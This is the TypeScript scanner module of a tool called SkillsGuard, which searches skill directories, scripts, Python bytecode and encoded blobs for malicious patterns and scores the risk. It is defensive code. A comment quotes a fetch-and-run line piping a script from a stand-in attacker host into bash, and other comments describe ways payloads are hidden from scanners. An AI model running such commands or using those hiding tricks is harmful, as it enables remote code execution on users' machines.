/**
 * SkillsGuard — Scanner
 * Walks a target directory (or single file), reads each candidate file,
 * runs all rules against raw content AND decoded blobs, deduplicates,
 * and returns a ScanResult.
 */

import { readdir, readFile, stat, realpath } from "node:fs/promises";
import { join, relative, extname, basename } from "node:path";
import type { Finding, ScanResult, ScanOptions, CustomRule, Rule, RiskScore, Severity } from "./types.js";
import { RULES } from "./rules.js";
import { findDecodedBlobs } from "./decode.js";
import { shouldIgnoreLine, isCommentLine, isDampenedPath } from "./lib/ignore.js";
import { isPlaceholderMatch } from "./lib/placeholder.js";
import { findReportableMatch, toGlobalRegex } from "./lib/matching.js";
import { maskLiteralHashes, usesHashBarrier } from "./lib/comments.js";
import { runConcurrent } from "./lib/concurrency.js";
import { BYTECODE_EXTENSIONS, MAX_BYTECODE_BYTES, inspectBytecode } from "./lib/bytecode.js";
import { MAX_SCAN_LINES, MULTILINE_WINDOW, countLines, splitIntoChunks } from "./lib/chunks.js";
import { NATIVE_EXTENSIONS, detectBinaryFormat, sniffFile } from "./lib/filekind.js";
import { findExecutableContent } from "./lib/inventory.js";
import { SILENT_SKIP_DIRS } from "./lib/skipdirs.js";

// Files we care about: SKILL.md, any markdown, shell scripts, Python, JS/TS,
// yaml/toml configs, and text files. We skip lock files and opaque binaries —
// except Python bytecode (.pyc/.pyo), which the interpreter executes and which
// is always inspected and reported (see lib/bytecode.ts).
const ALLOWED_EXTENSIONS = new Set<string>([
  // Markdown / text
  ".md", ".txt",
  // Shell
  ".sh", ".bash", ".zsh", ".fish", ".ksh",
  // PowerShell
  ".ps1", ".psm1", ".psd1",
  // Python
  ".py",
  // JavaScript / TypeScript
  ".js", ".mjs", ".cjs", ".ts", ".mts", ".cts",
  // Config / data
  ".json", ".yaml", ".yml", ".toml", ".env", ".conf", ".cfg",
  // Markup
  ".html", ".xml",
  // Ruby
  ".rb", ".rake", ".gemspec",
  // Docker
  ".dockerfile",
]);

// A directory name never decides that its contents are safe. Three tiers:
//
// 1. Scanned like any other directory (dist, build, __pycache__, ...): code a
//    skill ships and runs. Skipping __pycache__ is what let a skill hide a
//    .pyc from the scan, and a decoy src/ with a payload in dist/ is the same trick.
//
// 2. SILENT_SKIP_DIRS (lib/skipdirs.ts): VCS metadata and our own output.
//    Nothing loads code from them, so they are neither read nor reported.
//    Watch mode ignores events in the same set.

// 3. UNSCANNED_DIRS: dependency trees, virtualenvs, toolchain caches and
//    framework build trees. Running the rules over them is infeasible and
//    noisy, but they are NOT ignored: a decoy source file can import code from
//    any of them. If one holds executable code it is reported as unreviewed
//    content (SG-SKIP-002) rather than passed as clean. `--exclude <name>`
//    accepts it deliberately.
const UNSCANNED_DIRS = new Set<string>([
  "node_modules", ".trunk",
  ".mypy_cache", ".pytest_cache", "coverage",
  ".next", ".open-next", ".wrangler", "target", ".cargo",
  ".venv", "venv", "env", ".tox",
]);

// Files up to MAX_FILE_SIZE are scanned in one pass. Larger text files are NOT
// skipped (padding a file past the limit would hide whatever follows): they are
// scanned in overlapping chunks up to MAX_LARGE_FILE_SIZE. Anything bigger is
// not read at all and is reported as a HIGH finding rather than passed as clean.
const MAX_FILE_SIZE = 512 * 1024;
const MAX_LARGE_FILE_SIZE = 8 * 1024 * 1024;

// ─── Custom rule resolution ──────────────────────────────────────────────────

let _customCounter = 0;

/**
 * Convert a {@link CustomRule} (caller-supplied, partial) into a full {@link Rule}.
 * Missing fields receive safe defaults so callers only need to supply a pattern.
 */
export function resolveCustomRule(raw: CustomRule, index?: number): Rule {
  const counter = index ?? ++_customCounter;
  const id = raw.id ?? `CUSTOM-${String(counter).padStart(3, "0")}`;
  const flags = raw.flags ?? "gi";
  let compiledPattern: RegExp;
  try {
    compiledPattern = new RegExp(raw.pattern, flags);
  } catch (err) {
    throw new Error(`Invalid regex for rule "${id}": ${raw.pattern} — ${String(err)}`);
  }
  return {
    id,
    category: raw.category ?? "custom",
    severity: raw.severity ?? "HIGH",
    pattern: compiledPattern,
    message: raw.message ?? `Custom rule matched: ${raw.pattern}`,
  };
}

/**
 * Build the effective rule list for a scan, merging built-ins + extras.
 * Applies severity overrides after the list is assembled.
 */
function resolveRules(options?: ScanOptions): readonly Rule[] {
  const extras = (options?.extraRules ?? []).map((r, i) => resolveCustomRule(r, i + 1));
  const base = options?.rulesOnly ? extras : [...RULES, ...extras];

  const afterIgnore = options?.ignoreRules?.length
    ? base.filter((r) => !new Set(options.ignoreRules).has(r.id))
    : base;

  // Apply per-rule severity overrides
  const overrides = options?.severityOverrides;
  if (!overrides || Object.keys(overrides).length === 0) return afterIgnore;
  return afterIgnore.map((r) =>
    overrides[r.id] ? { ...r, severity: overrides[r.id]! } : r,
  );
}

// ─── File discovery ──────────────────────────────────────────────────────────

/**
 * A binary module the text rules cannot read. It runs with the skill's full
 * privileges when loaded (import, dlopen, ctypes, require), so it is reported
 * as unreviewed content rather than passed as clean.
 */
function nativeBinaryFinding(
  relPath: string,
  size: number,
  format: string,
  options?: ScanOptions,
): Finding | null {
  return tuneBuiltinFinding({
    ruleId: "SG-NATIVE-001",
    unanalyzed: true,
    category: "scanner",
    severity: "HIGH",
    message:
      `Native binary not analyzed — ${format}; it runs with the skill's full privileges ` +
      `when loaded (import, dlopen, ctypes) and its content is unreviewed`,
    file: relPath,
    line: 1,
    evidence: `${format}, ${size} bytes`,
    pattern: "",
  }, options);
}

/**
 * An UNSCANNED_DIRS directory that holds executable code (or is too big to
 * tell). Reported once per directory, not per file.
 */
async function unscannedDirFinding(
  dir: string,
  rootDir: string,
  options?: ScanOptions,
): Promise<Finding | null> {
  const { example, truncated } = await findExecutableContent(dir);
  if (example === null && !truncated) return null;
  const name = basename(dir);
  return tuneBuiltinFinding({
    ruleId: "SG-SKIP-002",
    unanalyzed: true,
    category: "scanner",
    severity: "HIGH",
    message:
      `Directory not analyzed — "${name}" is not scanned but ` +
      (example !== null ? "contains executable code" : "could not be fully inventoried") +
      `; its contents are unreviewed (exclude it explicitly to accept this)`,
    file: relative(rootDir, dir) || ".",
    line: 1,
    evidence: example !== null ? `e.g. ${relative(rootDir, example)}` : "inventory incomplete",
    pattern: "",
  }, options);
}

async function collectFiles(
  target: string,
  rootDir: string,
  options?: ScanOptions,
): Promise<{ readonly files: readonly string[]; readonly errors: readonly Finding[] }> {
  const s = await stat(target);
  if (s.isFile()) return { files: [target], errors: [] };

  const excludeSet = new Set(options?.excludePatterns ?? []);

  const files: string[] = [];
  const errors: Finding[] = [];
  const queue: string[] = [target];
  const visited = new Set<string>();

  while (queue.length > 0) {
    const dir = queue.pop()!;
    let realDir: string;
    try {
      realDir = await realpath(dir);
    } catch (err: unknown) {
      if (err instanceof Error && "code" in err && err.code === "ENOENT") {
        continue;
      }
      const msg = err instanceof Error ? err.message : String(err);
      errors.push({
        ruleId: "SG-READ-ERR",
        unanalyzed: true,
        category: "scanner",
        severity: "HIGH",
        message: `Failed to resolve directory path: ${msg}`,
        file: relative(rootDir, dir) || ".",
        line: 1,
        evidence: "Path resolution error",
        pattern: "",
      });
      continue;
    }
    if (visited.has(realDir)) continue;
    visited.add(realDir);

    let entries: { name: string; isDirectory(): boolean; isFile(): boolean; isSymbolicLink(): boolean }[];
    try {
      entries = await readdir(dir, { withFileTypes: true });
    } catch (err: unknown) {
      if (err instanceof Error && "code" in err && err.code === "ENOENT") {
        continue;
      }
      const msg = err instanceof Error ? err.message : String(err);
      errors.push({
        ruleId: "SG-READ-ERR",
        unanalyzed: true,
        category: "scanner",
        severity: "HIGH",
        message: `Failed to read directory entries: ${msg}`,
        file: relative(rootDir, dir) || ".",
        line: 1,
        evidence: "Directory read error",
        pattern: "",
      });
      continue;
    }
    for (const entry of entries) {
      const full = join(dir, entry.name);

      let isDir = entry.isDirectory();
      // Only regular files are ever opened: reading a FIFO or device node that
      // is merely named like a script would block the scan forever.
      let isRegularFile = entry.isFile();
      if (entry.isSymbolicLink()) {
        try {
          const symStat = await stat(full);
          isDir = symStat.isDirectory();
          isRegularFile = symStat.isFile();
        } catch (err: unknown) {
          if (err instanceof Error && "code" in err && err.code === "ENOENT") {
            continue;
          }
          const msg = err instanceof Error ? err.message : String(err);
          errors.push({
            ruleId: "SG-READ-ERR",
            unanalyzed: true,
            category: "scanner",
            severity: "HIGH",
            message: `Failed to stat symbolic link target: ${msg}`,
            file: relative(rootDir, full),
            line: 1,
            evidence: "Symbolic link stat error",
            pattern: "",
          });
          continue;
        }
      }

      if (isDir) {
        // An explicit --exclude is the caller's own decision: honoured silently.
        if (excludeSet.has(entry.name) || SILENT_SKIP_DIRS.has(entry.name)) continue;
        if (UNSCANNED_DIRS.has(entry.name)) {
          const unreviewed = await unscannedDirFinding(full, rootDir, options);
          if (unreviewed) errors.push(unreviewed);
          continue;
        }
        queue.push(full);
      } else if (isRegularFile) {
        // Skip files whose name or any path component matches an exclude pattern
        const relFull = relative(rootDir, full);
        const pathParts = relFull.split(/[\\/]/);
        if (excludeSet.size > 0 && pathParts.some((p) => excludeSet.has(p))) continue;
        const ext = extname(entry.name).toLowerCase();
        const nameNoExt = entry.name.toLowerCase();
        if (
          entry.name === "SKILL.md" ||
          nameNoExt === "dockerfile" ||
          nameNoExt.startsWith("dockerfile.") ||
          nameNoExt === "makefile" ||
          nameNoExt === "gemfile" ||
          BYTECODE_EXTENSIONS.has(ext) ||
          ALLOWED_EXTENSIONS.has(ext)
        ) {
          files.push(full);
        } else {
          // Not a name we recognise as text or script, but the name does not decide
          // what the file is: a native module needs no .so suffix to be loaded and a
          // script needs no extension. Classify by header.
          try {
            const sniff = await sniffFile(full);
            if (sniff.format !== null || NATIVE_EXTENSIONS.has(ext)) {
              const native = nativeBinaryFinding(relFull, sniff.size, sniff.format ?? "unrecognized binary header", options);
              if (native) errors.push(native);
            } else if (sniff.shebang) {
              files.push(full);
            }
          } catch (err: unknown) {
            if (err instanceof Error && "code" in err && (err.code === "ENOENT" || err.code === "ELOOP")) {
              continue;
            }
            const msg = err instanceof Error ? err.message : String(err);
            errors.push({
              ruleId: "SG-READ-ERR",
              unanalyzed: true,
              category: "scanner",
              severity: "HIGH",
              message: `Failed to read file: ${msg}`,
              file: relFull,
              line: 1,
              evidence: "Read error",
              pattern: "",
            });
          }
        }
      }
    }
  }

  return { files, errors };
}

// ─── Scanning logic ─────────────────────────────────────────────────────────

/**
 * Joins a window of lines into one string for the multi-line scan, folding backslash
 * and pipe continuations. Used for both the raw lines and their `#`-masked twins; the
 * folding never touches `#` or the mask character, so both results have the same
 * length and a match offset in one is valid in the other.
 */
function mergeWindow(windowLines: readonly string[]): string {
  return windowLines.join(" ").replace(/\\[\s\n]+/g, " ").replace(/\|\s*\n\s*/g, " | ");
}

export function scanText(
  text: string,
  filePath: string,
  decodedFrom?: string,
  options?: ScanOptions,
): readonly Finding[] {
  const findings: Finding[] = [];
  const lines = text.split("\n");
  // Rules with a `[^#\n]*` barrier use it to mean "later on the same command". They
  // match against this view, where every `#` that is not a real comment is
  // neutralised (see lib/comments.ts), so `curl https://evil.net/p.sh#x | bash` cannot
  // hide behind a mid-word `#`. Same length as `lines`, so offsets are interchangeable.
  // Rules that look for a `#` themselves (RB-004) keep the raw text: usesHashBarrier.
  const scanLines = lines.map(maskLiteralHashes);
  const rules = resolveRules(options);
  // Severity is lowered only for docs/data under test-like paths. Code under
  // tests/ or examples/ keeps full severity (see isDampenedPath).
  const inTestFile = isDampenedPath(filePath);

  // Line-by-line scan
  for (const rule of rules) {
    const regex = toGlobalRegex(rule.pattern);
    const usesHash = usesHashBarrier(rule.pattern);

    for (let lineIdx = 0; lineIdx < lines.length; lineIdx++) {
      const line = lines[lineIdx];
      if (line === undefined) continue;

      // 1. Inline suppression comment
      if (shouldIgnoreLine(line, rule.id)) continue;

      // 2. Pure comment-line filter — skip when the rule opts in.
      //    A full-line comment in a SKILL.md is almost always a README example
      //    or an explanation, not live malicious code.
      //    Exception: decoded blobs (decodedFrom set) are already de-commented
      //    content, so this filter doesn't apply to them.
      if (rule.skipCommentLines && !decodedFrom && isCommentLine(line)) continue;

      // 3. Placeholder filter — match-aware: it looks at what the rule matched, never
      //    at words elsewhere on the line. Only for rules that opt in, and only on the
      //    raw scan: decoded blobs with "example" in them are still suspicious. A line
      //    is excused only when EVERY match on it is a placeholder, so a harmless first
      //    match cannot hide a real second one (findReportableMatch).
      const match = findReportableMatch(
        regex,
        usesHash ? (scanLines[lineIdx] ?? line) : line,
        rule.skipPlaceholderLines && !decodedFrom
          ? (index, length) => isPlaceholderMatch(line, index, length)
          : undefined,
      );

      if (match) {
        // 4. Test-file path dampening: downgrade severity to INFO for findings
        //    in test/fixture/example paths so they show up but never block CI.
        //    Applied to HIGH and lower only — CRITICAL stays CRITICAL regardless.
        const severity =
          inTestFile && rule.severity !== "CRITICAL"
            ? "INFO"
            : rule.severity;

        findings.push({
          ruleId: rule.id,
          category: rule.category,
          severity,
          message: rule.message,
          file: filePath,
          line: lineIdx + 1,
          evidence: line.trim().slice(0, 200),
          pattern: rule.pattern.source,
          decodedFrom,
        });
      }
    }
  }

  // ponytail: Multi-line sliding window (5 lines) catches command continuations
  // (curl \ + newline + data). Strips backslash+pipe continuations before matching.
  // Skip if merged contains markdown fences (false positive on docs).
  const WINDOW_SIZE = MULTILINE_WINDOW;
  for (const rule of rules) {
    const regex = toGlobalRegex(rule.pattern);
    const usesHash = usesHashBarrier(rule.pattern);

    for (let startIdx = 0; startIdx < lines.length; startIdx++) {
      const merged = mergeWindow(lines.slice(startIdx, startIdx + WINDOW_SIZE));
      
      // Skip markdown code fences — sliding merge creates false positives on docs
      if (/```/.test(merged)) continue;
      
      if (shouldIgnoreLine(merged, rule.id)) continue;
      if (rule.skipCommentLines && !decodedFrom && isCommentLine(merged)) continue;

      const windowMatch = findReportableMatch(
        regex,
        usesHash && merged.includes("#")
          ? mergeWindow(scanLines.slice(startIdx, startIdx + WINDOW_SIZE))
          : merged,
        rule.skipPlaceholderLines && !decodedFrom
          ? (index, length) => isPlaceholderMatch(merged, index, length)
          : undefined,
      );

      if (windowMatch) {
        const severity = inTestFile && rule.severity !== "CRITICAL" ? "INFO" : rule.severity;
        // Dedupe: only add if no line-level finding exists at this location
        const existsAtLine = findings.some(f => 
          f.ruleId === rule.id && f.file === filePath && f.line === startIdx + 1
        );
        if (!existsAtLine) {
          findings.push({
            ruleId: rule.id,
            category: rule.category,
            severity,
            message: rule.message + " (multi-line pattern)",
            file: filePath,
            line: startIdx + 1,
            evidence: merged.trim().slice(0, 200),
            pattern: rule.pattern.source,
            decodedFrom,
          });
        }
      }
    }
  }

  return findings;
}

/**
 * Built-in scanner findings (SG-*) are not regex rules, but they should still
 * honour the caller's ignoreRules / severityOverrides.
 */
function tuneBuiltinFinding(finding: Finding, options?: ScanOptions): Finding | null {
  if (options?.ignoreRules?.includes(finding.ruleId)) return null;
  const severity = options?.severityOverrides?.[finding.ruleId];
  return severity ? { ...finding, severity } : finding;
}

/**
 * Bytecode (.pyc/.pyo) is binary, so it bypasses the utf-8 text path below. It
 * is never skipped — not by directory, not by size — because the interpreter
 * loads it in preference to the source sitting next to it. Strings recovered
 * from the file are run through the normal rules (line N = Nth recovered string).
 */
async function scanBytecodeFile(
  filePath: string,
  relPath: string,
  options?: ScanOptions,
): Promise<readonly Finding[]> {
  let size: number;
  let bytes: Uint8Array | null = null;
  try {
    size = (await stat(filePath)).size;
    if (size <= MAX_BYTECODE_BYTES) bytes = await readFile(filePath);
  } catch (err: unknown) {
    if (err instanceof Error && "code" in err && err.code === "ENOENT") {
      return [];
    }
    const errMsg = err instanceof Error ? err.message : String(err);
    return [{
      ruleId: "SG-READ-ERR",
      unanalyzed: true,
      category: "scanner",
      severity: "HIGH",
      message: `Failed to read file: ${errMsg}`,
      file: relPath,
      line: 1,
      evidence: `Read error`,
      pattern: "",
    }];
  }

  const { findings: bytecodeFindings, text } = inspectBytecode(bytes, relPath, size);
  const findings: Finding[] = [];
  for (const f of bytecodeFindings) {
    const tuned = tuneBuiltinFinding(f, options);
    if (tuned) findings.push(tuned);
  }

  if (text.length > 0) {
    for (const f of scanText(text, relPath, "bytecode-strings", options)) findings.push(f);
    for (const blob of findDecodedBlobs(text)) {
      for (const f of scanText(blob.decoded, relPath, `${blob.encoding}:${blob.raw.slice(0, 40)}`, options)) {
        findings.push(f);
      }
    }
  }
  return findings;
}

/**
 * A text file the scanner chose not to read in full (SG-SKIP-001). Unreviewed content is
 * never reported as clean, so this is HIGH and holds the risk score up (`unanalyzed`).
 */
function notAnalyzedFinding(
  relPath: string,
  message: string,
  evidence: string,
  options?: ScanOptions,
): Finding | null {
  return tuneBuiltinFinding({
    ruleId: "SG-SKIP-001",
    unanalyzed: true,
    category: "scanner",
    severity: "HIGH",
    message,
    file: relPath,
    line: 1,
    evidence,
    pattern: "",
  }, options);
}

/**
 * Scan a text file too big for one pass in overlapping chunks, mapping finding
 * line numbers back to the original file (see lib/chunks.ts). Encoded blobs are
 * decoded chunk by chunk too: the hex-run pattern overflows the regex engine's stack on
 * a multi-megabyte run (a crash, not a finding), and a chunk is at most a few hundred KB.
 */
function scanLargeText(content: string, relPath: string, options?: ScanOptions): Finding[] {
  const findings: Finding[] = [];
  for (const chunk of splitIntoChunks(content)) {
    for (const f of scanText(chunk.text, relPath, undefined, options)) {
      findings.push({ ...f, line: chunk.lineNumbers[f.line - 1] ?? f.line });
    }
    for (const blob of findDecodedBlobs(chunk.text)) {
      for (const f of scanText(blob.decoded, relPath, `${blob.encoding}:${blob.raw.slice(0, 40)}`, options)) {
        findings.push(f);
      }
    }
  }
  return findings;
}

async function scanFile(filePath: string, rootDir: string, options?: ScanOptions): Promise<readonly Finding[]> {
  const relPath = relative(rootDir, filePath);
  const ext = extname(filePath).toLowerCase();
  if (BYTECODE_EXTENSIONS.has(ext)) {
    return scanBytecodeFile(filePath, relPath, options);
  }
  let content: string;
  let size: number;
  try {
    size = (await stat(filePath)).size;
    if (NATIVE_EXTENSIONS.has(ext)) {
      // Named like a native module (reached when it is the scan target itself;
      // inside a directory walk these are reported by collectFiles).
      const { format } = await sniffFile(filePath);
      const native = nativeBinaryFinding(relPath, size, format ?? "unrecognized binary header", options);
      return native ? [native] : [];
    }
    if (size > MAX_LARGE_FILE_SIZE) {
      // Too big to read safely. Never report this as clean: the unread content
      // is exactly where a padded file would keep its payload.
      const notAnalyzed = notAnalyzedFinding(
        relPath,
        `File not analyzed — exceeds the ${MAX_LARGE_FILE_SIZE / (1024 * 1024)} MB scan limit ` +
          `(${(size / (1024 * 1024)).toFixed(1)} MB); its content is unreviewed`,
        `File size: ${size} bytes`,
        options,
      );
      return notAnalyzed ? [notAnalyzed] : [];
    }
    const raw = await readFile(filePath);
    const binaryFormat = detectBinaryFormat(raw, size);
    if (binaryFormat !== null) {
      // Collected under a text name (README.txt, run.py) but the header says it is
      // a binary module. Decoding it as text would show the rules nothing.
      const native = nativeBinaryFinding(relPath, size, binaryFormat, options);
      return native ? [native] : [];
    }
    if (size > MAX_FILE_SIZE) {
      // Scan time follows the line count, so a large file full of short or blank lines
      // is the expensive case (see MAX_SCAN_LINES). Report it instead of grinding on it.
      const lines = countLines(raw);
      if (lines > MAX_SCAN_LINES) {
        const notAnalyzed = notAnalyzedFinding(
          relPath,
          `File not analyzed — ${lines.toLocaleString("en-US")} lines exceeds the ` +
            `${MAX_SCAN_LINES.toLocaleString("en-US")}-line scan limit; its content is unreviewed`,
          `${lines} lines, ${size} bytes`,
          options,
        );
        return notAnalyzed ? [notAnalyzed] : [];
      }
    }
    content = raw.toString("utf-8");
  } catch (err: unknown) {
    if (err instanceof Error && "code" in err && err.code === "ENOENT") {
      return [];
    }
    const errMsg = err instanceof Error ? err.message : String(err);
    return [{
      ruleId: "SG-READ-ERR",
      unanalyzed: true,
      category: "scanner",
      severity: "HIGH",
      message: `Failed to read file: ${errMsg}`,
      file: relPath,
      line: 1,
      evidence: `Read error`,
      pattern: "",
    }];
  }

  // Large files are scanned and decoded chunk by chunk (scanLargeText).
  if (size > MAX_FILE_SIZE) return scanLargeText(content, relPath, options);

  // Array literal spread (not push(...x)): a large result set can exceed the
  // engine's limit on call arguments.
  const findings: Finding[] = [...scanText(content, relPath, undefined, options)];

  const blobs = findDecodedBlobs(content);
  for (const blob of blobs) {
    const blobFindings = scanText(blob.decoded, relPath, `${blob.encoding}:${blob.raw.slice(0, 40)}`, options);
    for (const f of blobFindings) findings.push(f);
  }

  return findings;
}

// ─── Deduplication ───────────────────────────────────────────────────────────

function dedup(findings: readonly Finding[]): readonly Finding[] {
  // Key on ruleId:file:line only — when both a raw finding and a decoded-blob
  // finding exist for the same location, keep the one with decodedFrom because
  // it carries more forensic evidence (encoding type + raw blob excerpt).
  const seen = new Map<string, Finding>();
  for (const f of findings) {
    const key = `${f.ruleId}:${f.file}:${f.line}`;
    const existing = seen.get(key);
    if (!existing || (!existing.decodedFrom && f.decodedFrom)) {
      seen.set(key, f);
    }
  }
  return [...seen.values()];
}

// ─── Public API ──────────────────────────────────────────────────────────────

const RISK_WEIGHTS: Record<string, number> = {
  CRITICAL: 25,
  HIGH: 10,
  MEDIUM: 3,
  LOW: 1,
  INFO: 0,
};

// Content the scanner could not review (see Finding.unanalyzed) says nothing
// about whether it is safe, and it is exactly where a payload would be hidden,
// so it must never be scored as low risk. Each such finding holds the score at
// the midpoint of the label band for its severity. The midpoint (not the band
// edge) keeps a HIGH one above common CI gates such as --max-risk 40, and the
// severity stays tunable: severityOverrides can lower it, ignoreRules drops it.
const UNANALYZED_FLOOR: Record<Severity, number> = {
  CRITICAL: 80, // band 61-100
  HIGH: 45,     // band 31-60
  MEDIUM: 20,   // band 11-30
  LOW: 5,       // band 1-10
  INFO: 0,
};

export function computeRiskScore(findings: readonly Finding[]): RiskScore {
  // Bucket findings by severity. Use log2 scale to prevent flooding from
  // dominating score while still reflecting volume impact.
  // ponytail: log2(n+1) scales 4→2.3, 20→4.4 — real difference shows
  const buckets: Record<string, number> = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0 };
  for (const f of findings) buckets[f.severity] = (buckets[f.severity] ?? 0) + 1;

  let raw = 0;
  for (const [sev, count] of Object.entries(buckets)) {
    raw += Math.log2(count + 1) * (RISK_WEIGHTS[sev] ?? 0);
  }
  let floor = 0;
  for (const f of findings) {
    if (f.unanalyzed) floor = Math.max(floor, UNANALYZED_FLOOR[f.severity] ?? 0);
  }
  const score = Math.min(100, Math.max(raw, floor));

  let label: RiskScore["label"];
  if (score === 0)       label = "NONE";
  else if (score <= 10)  label = "LOW";
  else if (score <= 30)  label = "MEDIUM";
  else if (score <= 60)  label = "HIGH";
  else                   label = "CRITICAL";

  return { score, label };
}

export async function scan(target: string, options?: ScanOptions): Promise<ScanResult> {
  const start = Date.now();

  let rootDir: string;
  try {
    const s = await stat(target);
    rootDir = s.isDirectory() ? target : join(target, "..");
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    throw new Error(`Cannot access target '${target}': ${msg}`);
  }

  const { files, errors } = await collectFiles(target, rootDir, options);

  const maxFindings = options?.maxFindings ?? 0;
  const allFindings: Finding[] = [...errors];

  // runConcurrent doesn't support early-exit, so for maxFindings we fall back
  // to sequential scanning so we can stop as soon as the cap is hit.
  if (maxFindings > 0) {
    for (const file of files) {
      if (allFindings.length >= maxFindings) break;
      const findings = await scanFile(file, rootDir, options);
      for (const f of findings) allFindings.push(f);
    }
  } else {
    const scanResults = await runConcurrent(files, 16, (file) => scanFile(file, rootDir, options));
    for (const findings of scanResults) {
      for (const f of findings) allFindings.push(f);
    }
  }

  const dedupedFindings = [...dedup(allFindings)];
  return {
    target,
    filesScanned: files.length,
    findings: dedupedFindings,
    durationMs: Date.now() - start,
    riskScore: computeRiskScore(dedupedFindings),
  };
}
